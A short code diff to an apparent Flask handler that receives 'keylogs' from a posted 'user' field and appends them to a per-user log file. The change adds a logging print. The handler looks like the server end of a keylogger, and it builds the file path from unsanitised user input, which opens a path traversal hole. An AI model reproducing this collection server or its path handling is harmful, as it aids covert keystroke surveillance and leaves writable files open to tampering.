@@ -15,6 +15,7 @@ def getData():
     return { 'success': 0, 'message': 'Missing keys in post data'}
 
   user, newData = request.form['user'], request.form['keylogs']
+  print("[INFO] Received new data from ", user)
 
   logFilePath = './logs/'+user+'_log.out'
   logFile = open(logFilePath, 'a')
